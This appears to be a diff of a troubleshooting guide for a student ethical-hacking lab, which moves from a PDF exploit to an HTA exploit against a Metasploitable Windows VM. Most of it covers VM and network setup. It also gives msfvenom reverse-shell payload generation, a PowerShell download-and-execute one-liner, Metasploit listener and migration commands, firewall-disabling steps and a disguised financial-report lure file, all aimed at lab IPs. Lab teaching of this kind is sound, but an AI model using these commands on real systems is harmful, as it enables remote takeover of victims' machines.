@@ -1,7 +1,66 @@
 # Troubleshooting Guide
-## Ethical Hacking PDF Exploit Lab
+## Ethical Hacking Lab - HTA Exploit
 
-This guide covers common issues and their solutions.
+This guide covers common issues with the HTA exploit lab and their solutions.
+
+---
+
+## Quick Diagnostic Flowchart
+
+Use this flowchart to quickly identify your issue:
+
+```mermaid
+graph TD
+    START{What's the problem?} -->|Setup fails| SETUP_BRANCH{Which error?}
+    START -->|VMs won't communicate| NETWORK_BRANCH{Which test fails?}
+    START -->|HTA exploit doesn't work| EXPLOIT_BRANCH{What happens?}
+    START -->|No Meterpreter session| METASPLOIT_BRANCH{Which stage?}
+    START -->|Performance issues| PERF_BRANCH{What's slow?}
+
+    SETUP_BRANCH -->|VirtualBox not found| S1[Install VirtualBox<br/>Setup Issues #1]
+    SETUP_BRANCH -->|Vagrant not found| S2[Install Vagrant<br/>Setup Issues #2]
+    SETUP_BRANCH -->|VT-x not enabled| S3[Enable in BIOS<br/>Setup Issues #4]
+    SETUP_BRANCH -->|Disk space| S4[Free up 40GB<br/>Setup Issues #3]
+
+    NETWORK_BRANCH -->|Can't ping Windows| N1[Check Host-Only network<br/>Network Problems #1]
+    NETWORK_BRANCH -->|Can't reach HTTP| N2[Check HTTP server<br/>Network Problems #3]
+    NETWORK_BRANCH -->|Kali has wrong IP| N3[Reconfigure network<br/>Network Problems #2]
+
+    EXPLOIT_BRANCH -->|HTA doesn't execute| E1[Check file association<br/>HTA Exploit Problems #3]
+    EXPLOIT_BRANCH -->|Downloads but fails| E2[Check payload syntax<br/>HTA Exploit Problems #4]
+    EXPLOIT_BRANCH -->|HTA not created| E3[Run create_exe_payload.sh<br/>HTA Exploit Problems #1]
+
+    METASPLOIT_BRANCH -->|Listener won't start| M1[Port 4444 in use<br/>Metasploit Issues #1]
+    METASPLOIT_BRANCH -->|Session closes immediately| M2[Use AutoRunScript<br/>Metasploit Issues #2]
+    METASPLOIT_BRANCH -->|Stuck at 'Sending stage'| M3[Check firewall<br/>Metasploit Issues #3]
+
+    PERF_BRANCH -->|VMs very slow| P1[Allocate more resources<br/>Performance Issues #1]
+    PERF_BRANCH -->|Disk space low| P2[Clean up Vagrant boxes<br/>Performance Issues #2]
+
+    style START fill:#3498db,color:#fff
+    style S1 fill:#e74c3c,color:#fff
+    style S2 fill:#e74c3c,color:#fff
+    style S3 fill:#e74c3c,color:#fff
+    style S4 fill:#e74c3c,color:#fff
+    style N1 fill:#f39c12,color:#fff
+    style N2 fill:#f39c12,color:#fff
+    style N3 fill:#f39c12,color:#fff
+    style E1 fill:#9b59b6,color:#fff
+    style E2 fill:#9b59b6,color:#fff
+    style E3 fill:#9b59b6,color:#fff
+    style M1 fill:#1abc9c,color:#fff
+    style M2 fill:#1abc9c,color:#fff
+    style M3 fill:#1abc9c,color:#fff
+    style P1 fill:#34495e,color:#fff
+    style P2 fill:#34495e,color:#fff
+```
+
+**Color Legend:**
+- 🔴 Red: Setup/Installation issues
+- 🟠 Orange: Network connectivity issues
+- 🟣 Purple: HTA exploit issues
+- 🟢 Teal: Metasploit/listener issues
+- ⚫ Dark: Performance/resource issues
 
 ---
 
@@ -10,9 +69,10 @@ This guide covers common issues and their solutions.
 1. [Setup Issues](#setup-issues)
 2. [Network Problems](#network-problems)
 3. [VM Issues](#vm-issues)
-4. [Exploit Problems](#exploit-problems)
-5. [Performance Issues](#performance-issues)
-6. [General Tips](#general-tips)
+4. [HTA Exploit Problems](#hta-exploit-problems)
+5. [Metasploit Issues](#metasploit-issues)
+6. [Performance Issues](#performance-issues)
+7. [General Tips](#general-tips)
 
 ---
 
@@ -62,561 +122,648 @@ Please install Vagrant from: https://www.vagrantup.com/
 Available: 25GB, Required: 40GB
 ```
 
-**Solutions:**
-
-**Option 1: Free up space**
+**Solution:**
 ```bash
-# Remove old VirtualBox VMs
-VBoxManage list vms
-VBoxManage unregistervm <vm-name> --delete
+# Check disk usage
+df -h
 
-# Clean Vagrant boxes
+# Free up space:
+# 1. Remove old Vagrant boxes
 vagrant box prune
 
-# Clean Docker (if installed)
+# 2. Remove unused Docker images (if applicable)
 docker system prune -a
-```
 
-**Option 2: Use external drive**
-```bash
-# Move VirtualBox default machine folder
-VBoxManage setproperty machinefolder /path/to/external/drive
+# 3. Empty trash/recycle bin
+# 4. Uninstall unused applications
 ```
 
 ---
 
-### Issue: "Adobe Reader download fails"
+### Issue: "VT-x/AMD-V not enabled"
 
 **Symptoms:**
-```
-✗ Failed to download Adobe Reader
-```
+- VMs fail to start
+- Error about virtualization
 
-**Solutions:**
+**Solution:**
+1. Reboot computer
+2. Enter BIOS/UEFI (F2, F10, or DEL during boot)
+3. Find "Virtualization Technology" or "VT-x" or "AMD-V"
+4. Enable it
+5. Save and reboot
 
-**Option 1: Manual download**
-1. Download from: https://archive.org/download/adobe-reader-9.5/AdbeRdr950_en_US.exe
-2. Save to: `resources/AdobeReader_9.5.exe`
-3. Re-run `./setup.sh`
-
-**Option 2: Check internet connection**
+**Verify:**
 ```bash
-# Test connectivity
-ping archive.org
-curl -I https://archive.org
-```
+# Linux
+egrep -c '(vmx|svm)' /proc/cpuinfo
+# Output > 0 = enabled
 
-**Option 3: Use alternative source**
-- Check INSTALLATION.md for alternative download links
-- Verify file size is around 50MB
+# macOS
+sysctl -a | grep machdep.cpu.features | grep VMX
+```
 
 ---
 
 ## Network Problems
 
-### Issue: "Kali cannot reach Windows"
+### Issue: VMs can't communicate (Kali ↔ Windows)
 
 **Symptoms:**
-```
-✗ Kali → Windows: FAILED
-```
+- Ping fails between VMs
+- HTTP server not reachable
+- Meterpreter won't connect
 
-**Solutions:**
-
-**Step 1: Verify VMs are running**
+**Diagnosis:**
 ```bash
-cd vagrant
-vagrant status
+# On Kali
+ping 192.168.56.102
 
-# Should show both running:
-# kali     running (virtualbox)
-# win2k8   running (virtualbox)
+# On Windows (PowerShell)
+Test-Connection 192.168.56.101
 ```
 
-**Step 2: Check IP addresses**
+**Solution 1: Verify Host-Only Network**
 ```bash
-# From Kali
-vagrant ssh kali
-ip addr show eth1
-
-# Should show: 192.168.56.101
-```
-
-**Step 3: Restart network**
-```bash
-# From Kali
-vagrant ssh kali
-sudo systemctl restart networking
-```
-
-**Step 4: Check VirtualBox network**
-```bash
+# Check if network exists
 VBoxManage list hostonlyifs
 
-# Should show:
-# Name: vboxnet0
-# IPAddress: 192.168.56.1
+# If missing, recreate
+VBoxManage hostonlyif create
+VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
 ```
 
-**Step 5: Recreate network**
+**Solution 2: Reconfigure Kali Network**
 ```bash
-# Delete old network
-VBoxManage hostonlyif remove vboxnet0
+# SSH into Kali
+vagrant ssh kali
 
-# Run setup again
-./setup.sh
+# Check interfaces
+ip addr show
+
+# Manually configure if needed
+sudo ip addr add 192.168.56.101/24 dev eth1
+sudo ip link set eth1 up
+sudo ip route add 192.168.56.0/24 dev eth1
+```
+
+**Solution 3: Restart VMs**
+```bash
+cd vagrant
+vagrant reload
 ```
 
 ---
 
-### Issue: "Host-only network creation fails"
+### Issue: Kali network interface not configured
 
 **Symptoms:**
-```
-Error creating host-only network
-```
+- Kali doesn't have IP 192.168.56.101
+- Network provisioning script fails
 
-**Solutions:**
-
-**Linux:**
+**Solution:**
 ```bash
-# May need to load kernel module
-sudo modprobe vboxnetadp
-sudo modprobe vboxnetflt
+# SSH into Kali
+vagrant ssh kali
+
+# Run network configuration script manually
+sudo /vagrant/vagrant/provisioning/kali/configure_network_early.sh
+
+# Verify
+ip addr show | grep 192.168.56.101
 ```
 
-**macOS:**
-- Check System Preferences > Security & Privacy
-- Allow Oracle system extensions
-- Reboot may be required
+---
 
-**Windows:**
-- Run as Administrator
-- Disable Hyper-V if enabled:
-  ```powershell
-  bcdedit /set hypervisorlaunchtype off
-  ```
-- Reboot
+### Issue: "HTTP server not responding" during Windows boot
+
+**Symptoms:**
+- During initial setup or reboot, Windows shows "HTTP server not responding"
+- Test shows WARNING instead of SUCCESS
+
+**This is Normal:**
+- The HTTP server starts automatically on Kali via systemd service
+- It may take 10-30 seconds after boot for the service to be fully ready
+- Windows connectivity test will retry for up to 30 seconds
+- If it still shows WARNING, the server will be ready shortly after boot completes
+
+**Verify HTTP server is running:**
+```bash
+# SSH into Kali
+vagrant ssh kali
+
+# Check service status
+sudo systemctl status hta-http-server.service
+
+# Should show: Active: active (running)
+```
+
+**If service is not running:**
+```bash
+# Start the service
+sudo systemctl start hta-http-server.service
+
+# Check for errors
+sudo journalctl -u hta-http-server.service -n 50
+```
+
+---
+
+### Issue: Windows can't reach HTTP server
+
+**Symptoms:**
+- `Invoke-WebRequest` fails
+- HTA exploit can't download payload
+
+**Diagnosis:**
+```powershell
+# On Windows
+Test-Connection 192.168.56.101
+Invoke-WebRequest http://192.168.56.101:8080/shell.ps1
+```
+
+**Solution:**
+```bash
+# On Kali, verify HTTP server is running
+ss -tuln | grep 8080
+
+# Check systemd service status
+sudo systemctl status hta-http-server.service
+
+# If not running, start the service
+sudo systemctl start hta-http-server.service
+
+# Or start manually if needed
+cd /home/vagrant/hta_payloads
+python3 -m http.server 8080 --bind 192.168.56.101 &
+
+# Test from Kali
+curl http://192.168.56.101:8080/shell.ps1
+```
 
 ---
 
 ## VM Issues
 
-### Issue: "Kali VM won't start"
+### Issue: Kali VM won't boot
 
 **Symptoms:**
-```
-Kali VM failed to start
-```
+- Vagrant hangs at "Waiting for machine to boot"
+- SSH timeout
 
-**Solutions:**
-
-**Step 1: Check logs**
-```bash
-cd vagrant
-vagrant up kali --debug
-```
-
-**Step 2: Increase timeout**
+**Solution 1: Increase Timeout**
 Edit `vagrant/Vagrantfile`:
 ```ruby
-config.vm.boot_timeout = 1200  # Increase to 20 minutes
+kali.vm.boot_timeout = 900  # 15 minutes
+kali.ssh.connect_timeout = 600
 ```
 
-**Step 3: Check virtualization**
+**Solution 2: Destroy and Rebuild**
 ```bash
-# Linux
-egrep -c '(vmx|svm)' /proc/cpuinfo
-# Should be > 0
-
-# Enable in BIOS if needed
-```
-
-**Step 4: Rebuild VM**
-```bash
+cd vagrant
 vagrant destroy kali -f
 vagrant up kali
 ```
 
 ---
 
-### Issue: "Windows VM stuck at boot"
+### Issue: Windows VM won't boot
 
 **Symptoms:**
-- Windows VM shows black screen
-- Stuck at "Configuring Windows"
+- GUI doesn't appear
+- WinRM timeout
 
-**Solutions:**
-
-**Step 1: Wait longer**
-- Windows first boot can take 10-15 minutes
-- Watch for disk activity
-
-**Step 2: Increase resources**
+**Solution 1: Increase Timeout**
 Edit `vagrant/Vagrantfile`:
 ```ruby
-vb.memory = "6144"  # Increase to 6GB
-vb.cpus = 4         # Increase to 4 CPUs
+win.vm.boot_timeout = 900
+win.winrm.timeout = 1800
 ```
 
-**Step 3: Check VT-x/AMD-V**
-```bash
-# Ensure virtualization is enabled in BIOS
-VBoxManage list hostinfo | grep -i vt-x
-```
+**Solution 2: Check VirtualBox GUI**
+1. Open VirtualBox Manager
+2. Find Windows VM
+3. Start manually
+4. Check for errors in GUI
 
-**Step 4: Rebuild from scratch**
+---
+
+### Issue: VM stuck at provisioning
+
+**Symptoms:**
+- Setup hangs during provisioning
+- Script doesn't complete
+
+**Solution:**
 ```bash
-vagrant destroy win2k8 -f
-vagrant box remove rapid7/metasploitable3-win2k8
-vagrant up win2k8
+# Cancel setup (Ctrl+C)
+
+# SSH into VM manually
+vagrant ssh kali  # or: vagrant winrm win2k8
+
+# Run provisioning script manually
+cd /vagrant/vagrant/provisioning/kali
+./configure_network_early.sh
+./install_tools.sh
+./create_exe_payload.sh
 ```
 
 ---
 
-### Issue: "VM snapshot restore fails"
+## HTA Exploit Problems
+
+### Issue: HTA file not created
 
 **Symptoms:**
-```
-Failed to restore snapshot
-```
+- `Q4_Financial_Report.pdf.lnk` missing
+- Provisioning completed but no HTA
 
-**Solutions:**
-
-**Step 1: List snapshots**
+**Solution:**
 ```bash
-VBoxManage snapshot "Kali_PDF_Exploit_Lab" list
-VBoxManage snapshot "Windows_PDF_Target_Lab" list
-```
+# SSH into Kali
+vagrant ssh kali
 
-**Step 2: Manual restore**
-```bash
-# Stop VM
-vagrant halt kali
+# Manually run HTA generation script
+cd /vagrant/vagrant/provisioning/kali
+./create_exe_payload.sh
 
-# Restore snapshot
-VBoxManage snapshot "Kali_PDF_Exploit_Lab" restore "Clean_State"
-
-# Start VM
-vagrant up kali
-```
-
-**Step 3: Recreate snapshot**
-```bash
-# Delete old snapshot
-VBoxManage snapshot "Kali_PDF_Exploit_Lab" delete "Clean_State"
-
-# Create new one
-vagrant up kali
-VBoxManage snapshot "Kali_PDF_Exploit_Lab" take "Clean_State"
+# Verify files created
+ls -la /vagrant/exploits/hta/
 ```
 
 ---
 
-## Exploit Problems
-
-### Issue: "Malicious PDF not created"
+### Issue: PowerShell payload missing
 
 **Symptoms:**
-```
-✗ Failed to create main PDF
-```
+- `shell.ps1` not found
+- HTTP server can't serve payload
 
-**Solutions:**
-
-**Step 1: Check Metasploit**
+**Solution:**
 ```bash
+# Generate manually on Kali
 vagrant ssh kali
-msfconsole --version
-```
 
-**Step 2: Update Metasploit**
-```bash
-vagrant ssh kali
-sudo apt update
-sudo apt install metasploit-framework
-sudo msfdb init
-```
+# Create payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+    LHOST=192.168.56.101 \
+    LPORT=4444 \
+    -a x64 \
+    --platform windows \
+    -f psh \
+    -o /vagrant/exploits/hta/shell.ps1
 
-**Step 3: Manual PDF generation**
-```bash
-vagrant ssh kali
-msfconsole
-
-# In Metasploit:
-use exploit/windows/fileformat/adobe_cooltype_sing
-set LHOST 192.168.56.101
-set LPORT 4444
-set FILENAME test.pdf
-exploit
-exit
-```
-
-**Step 4: Check permissions**
-```bash
-vagrant ssh kali
-mkdir -p ~/.msf4/local
-chmod 755 ~/.msf4/local
+# Verify
+cat /vagrant/exploits/hta/shell.ps1
 ```
 
 ---
 
-### Issue: "Exploit doesn't trigger"
+### Issue: HTA file doesn't execute
 
 **Symptoms:**
-- PDF opens on Windows
-- No Meterpreter session received
+- Double-clicking does nothing
+- No PowerShell window (even hidden)
+- No network activity
 
-**Solutions:**
-
-**Step 1: Verify listener is running**
-```bash
-# On Kali - check if port 4444 is listening
-netstat -tlnp | grep 4444
+**Diagnosis:**
+```powershell
+# On Windows, test PowerShell command manually
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
 ```
 
-**Step 2: Check Windows security**
-```bash
-# On Windows PowerShell
-Get-MpPreference | Select DisableRealtimeMonitoring
-# Should be: True
+**Solution 1: Check File Association**
+```powershell
+# Verify .lnk files open with Explorer
+Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.lnk
+```
 
+**Solution 2: Check Windows Security**
+```powershell
+# Verify security is disabled
 Get-NetFirewallProfile | Select Name, Enabled
-# All should be: False
+Get-MpPreference | Select DisableRealtimeMonitoring
 ```
 
-**Step 3: Try alternative exploit**
+**Solution 3: Regenerate HTA**
 ```bash
+# On Kali
 vagrant ssh kali
-cd /vagrant/exploits
-
-# Use alternative PDF
-cp ~/.msf4/local/JOAN-ESPINACH-ALT.pdf /vagrant/exploits/
-```
-
-**Step 4: Verify Adobe version**
-- On Windows, open Adobe Reader
-- Help > About Adobe Reader
-- Should say: Version 9.5.0
-
-**Step 5: Check network connectivity**
-```bash
-# From Windows command prompt
-ping 192.168.56.101
+cd /vagrant/vagrant/provisioning/kali
+./create_exe_payload.sh
 ```
 
 ---
 
-### Issue: "Meterpreter session dies immediately"
+### Issue: HTA downloads but doesn't execute payload
 
 **Symptoms:**
-```
-[*] Meterpreter session 1 opened
-[*] Session 1 closed
+- HTTP server shows GET request
+- But no Meterpreter session
+
+**Diagnosis:**
+```bash
+# Check HTTP server logs
+cat /tmp/http_server.log
+
+# Check Metasploit listener
+# In msfconsole:
+jobs
 ```
 
-**Solutions:**
+**Solution:**
+```bash
+# Verify payload syntax
+vagrant ssh kali
+cat /vagrant/exploits/hta/shell.ps1
 
-**Step 1: Use staged payload**
-In Metasploit:
-```
-set PAYLOAD windows/meterpreter/reverse_tcp
-# (not reverse_https or reverse_http)
+# Should start with: function, $, or Invoke-
+
+# Test payload manually on Kali
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; exploit"
+
+# Then on Windows:
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
 ```
 
-**Step 2: Keep Adobe Reader open**
-- Don't close PDF immediately
-- Leave window open
+---
 
-**Step 3: Increase session timeout**
+## Metasploit Issues
+
+### Issue: Meterpreter listener won't start
+
+**Symptoms:**
+- "Address already in use" error
+- Port 4444 blocked
+
+**Solution:**
+```bash
+# Check what's using port 4444
+ss -tuln | grep 4444
+
+# Kill existing process
+ps aux | grep msfconsole
+kill <PID>
+
+# Or use different port
+# Edit start_hta_attack.sh:
+LPORT="5555"
 ```
-set SessionCommunicationTimeout 300
-set SessionExpirationTimeout 600
+
+---
+
+### Issue: Session opens then immediately closes
+
+**Symptoms:**
+- "Meterpreter session 1 opened"
+- Then "Meterpreter session 1 closed"
+
+**Solution:**
+```bash
+# Use AutoRunScript to migrate process
+# In start_hta_attack.sh resource file, add:
+set AutoRunScript post/windows/manage/migrate
+
+# Or manually migrate after session opens
+meterpreter > ps
+meterpreter > migrate <PID_of_explorer.exe>
+```
+
+---
+
+### Issue: "Sending stage" hangs forever
+
+**Symptoms:**
+- Listener shows "Sending stage"
+- Never completes
+
+**Solution 1: Check Firewall**
+```powershell
+# On Windows
+Get-NetFirewallProfile | Select Name, Enabled
+# Should show: Enabled = False
+
+# If enabled, disable
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+
+**Solution 2: Check Network**
+```bash
+# Verify bidirectional connectivity
+# From Kali:
+ping 192.168.56.102
+
+# From Windows:
+Test-Connection 192.168.56.101
 ```
 
 ---
 
 ## Performance Issues
 
-### Issue: "VMs running very slowly"
+### Issue: VMs are very slow
 
-**Solutions:**
+**Symptoms:**
+- Laggy GUI
+- Commands take long time
+- High CPU usage on host
 
-**Step 1: Check host resources**
-```bash
-# Linux/Mac
-htop
-
-# Windows
-Task Manager > Performance
-```
-
-**Step 2: Reduce VM resources**
+**Solution 1: Allocate More Resources**
 Edit `vagrant/Vagrantfile`:
 ```ruby
-# Kali
-vb.memory = "1024"  # Reduce to 1GB
-vb.cpus = 1
-
-# Windows
-vb.memory = "2048"  # Reduce to 2GB
-vb.cpus = 1
+kali.vm.provider "virtualbox" do |vb|
+  vb.memory = "4096"  # Increase from 3GB to 4GB
+  vb.cpus = 4         # Increase from 2 to 4
+end
 ```
 
-**Step 3: Disable GUI for Kali**
+**Solution 2: Close Other Applications**
+- Close browser tabs
+- Stop Docker containers
+- Close IDE/editors
+- Disable antivirus scans
+
+**Solution 3: Use Headless Mode**
+For Windows VM:
 ```ruby
-vb.gui = false  # Use SSH only
+win.vm.provider "virtualbox" do |vb|
+  vb.gui = false  # Run headless
+end
 ```
-
-**Step 4: Close other applications**
-- Close web browsers
-- Stop other VMs
-- Disable unnecessary services
 
 ---
 
-### Issue: "Lab setup takes forever"
+### Issue: Disk space running out
 
-**Solutions:**
+**Symptoms:**
+- "No space left on device"
+- VMs won't start
 
-**Step 1: Use faster mirror**
+**Solution:**
 ```bash
-# On Kali, edit /etc/apt/sources.list
-# Use closest mirror
+# Clean up Vagrant boxes
+vagrant box prune
+
+# Compact VMs
+cd vagrant
+vagrant halt
+
+# Find VM disk locations
+VBoxManage list vms
+
+# Compact (replace with actual path)
+VBoxManage modifymedium disk /path/to/vm.vdi --compact
+
+# Remove old snapshots
+VBoxManage snapshot "VM_NAME" delete "Old_Snapshot"
 ```
-
-**Step 2: Download boxes manually**
-```bash
-# Download boxes first
-vagrant box add kalilinux/rolling
-vagrant box add rapid7/metasploitable3-win2k8
-
-# Then run setup
-./setup.sh
-```
-
-**Step 3: Use SSD**
-- Move VirtualBox folder to SSD
-- Significantly faster than HDD
 
 ---
 
 ## General Tips
 
-### Enable Verbose Logging
+### Reset Everything
+
+If nothing works, nuclear option:
 
 ```bash
-# For setup script
-bash -x ./setup.sh
-
-# For Vagrant
+# 1. Destroy VMs
 cd vagrant
-vagrant up --debug &> vagrant.log
-```
+vagrant destroy -f
 
-### Check System Logs
+# 2. Remove boxes
+vagrant box remove kalilinux/rolling --all
+vagrant box remove rapid7/metasploitable3-win2k8 --all
 
-```bash
-# Kali logs
-vagrant ssh kali
-journalctl -xe
+# 3. Remove network
+VBoxManage hostonlyif remove vboxnet0
 
-# Windows logs
-# Event Viewer > Windows Logs > System
-```
-
-### Clean Slate Rebuild
-
-```bash
-# Complete cleanup
-./cleanup.sh
-
-# Remove everything
+# 4. Clean Vagrant cache
 rm -rf ~/.vagrant.d/boxes/*
-VBoxManage list vms | awk '{print $1}' | xargs -I {} VBoxManage unregistervm {} --delete
+rm -rf .vagrant/
 
-# Start fresh
+# 5. Start fresh
+cd ..
 ./setup.sh
 ```
 
-### Get VM Status
+---
+
+### Enable Debug Mode
+
+For Vagrant issues:
 
 ```bash
-cd vagrant
+# Run with debug output
+VAGRANT_LOG=info vagrant up
 
-# Check status
-vagrant status
-
-# Check global status
-vagrant global-status
-
-# Reload VM configuration
-vagrant reload
-
-# Re-provision
-vagrant provision
+# Or for more detail
+VAGRANT_LOG=debug vagrant up 2>&1 | tee vagrant.log
 ```
 
 ---
 
-## Still Having Issues?
+### Check Logs
 
-### Collect Debugging Information
-
+**Kali Logs:**
 ```bash
-# System info
-uname -a
-VBoxManage --version
-vagrant --version
-
-# VM status
-cd vagrant
-vagrant status
-
-# Network info
-VBoxManage list hostonlyifs
-ip addr  # or ipconfig on Windows
-
-# Disk space
-df -h
+vagrant ssh kali
+sudo journalctl -xe
+dmesg | tail -50
 ```
 
-### Ask for Help
+**Windows Event Logs:**
+```powershell
+# On Windows
+Get-EventLog -LogName System -Newest 50
+Get-EventLog -LogName Application -Newest 50
 
-When asking for help, include:
-
-1. Your operating system and version
-2. VirtualBox version
-3. Vagrant version
-4. Error messages (full output)
-5. What you've already tried
-6. Relevant logs
-
-### Community Resources
-
-- VirtualBox Forums: https://forums.virtualbox.org/
-- Vagrant GitHub Issues: https://github.com/hashicorp/vagrant/issues
-- Metasploit Slack: https://metasploit.com/slack
+# PowerShell logs
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50
+```
 
 ---
 
-## Known Limitations
+### Verify Provisioning
 
-### macOS M1/M2 (ARM)
-- VirtualBox doesn't support ARM yet
-- Use VMware Fusion or Parallels instead
-- Or use cloud-based lab
+Check if all provisioning scripts ran:
 
-### Corporate Networks
-- May block VM-to-VM communication
-- Disable VPN during lab
-- Use personal device if possible
+```bash
+# Check Kali
+vagrant ssh kali
+ls -la /home/vagrant/.msf4/local/
+# Should see shell.ps1 and HTA file
 
-### Antivirus Software
-- May quarantine Metasploit
-- May block malicious PDFs
-- Disable AV during lab (host machine only)
+# Check Windows
+vagrant winrm win2k8 -c "dir C:\vagrant\exploits\hta"
+# Should see HTA file
+```
 
 ---
 
-**Remember: Most issues are resolved by simply re-running `./setup.sh` or `./reset.sh`!**
+### Network Diagnostic Commands
+
+**On Kali:**
+```bash
+# Network interfaces
+ip addr show
+
+# Routing table
+ip route show
+
+# Test connectivity
+ping 192.168.56.102
+nc -zv 192.168.56.102 445  # SMB port
+
+# DNS (should fail - no internet)
+ping google.com
+```
+
+**On Windows:**
+```powershell
+# Network configuration
+ipconfig /all
+
+# Routing table
+route print
+
+# Test connectivity
+Test-Connection 192.168.56.101
+Test-NetConnection 192.168.56.101 -Port 8080
+```
+
+---
+
+### Still Need Help?
+
+1. **Check documentation:**
+   - [README.md](README.md) - Main guide
+   - [INSTALLATION.md](INSTALLATION.md) - Setup instructions
+   - [exploits/hta/README.md](exploits/hta/README.md) - Exploit details
+   - [docs/NETWORK_DEBUGGING_GUIDE.md](docs/NETWORK_DEBUGGING_GUIDE.md)
+
+2. **Gather information:**
+   - Your OS and version
+   - VirtualBox version: `VBoxManage --version`
+   - Vagrant version: `vagrant --version`
+   - Error messages (full output)
+   - What you tried already
+
+3. **Open GitHub issue:**
+   - https://github.com/gcheliz/ethical-hacking-student-lab/issues
+   - Include all information above
+   - Steps to reproduce
+
+4. **Ask instructor:**
+   - Provide error logs
+   - Screenshots of errors
+   - What troubleshooting steps you tried
+
+---
+
+**Most issues are network-related. Start with network troubleshooting first!**
+
+---
+
+*Last Updated: 2026-01-09*
+*Version: 2.0 - HTA Exploit Lab*
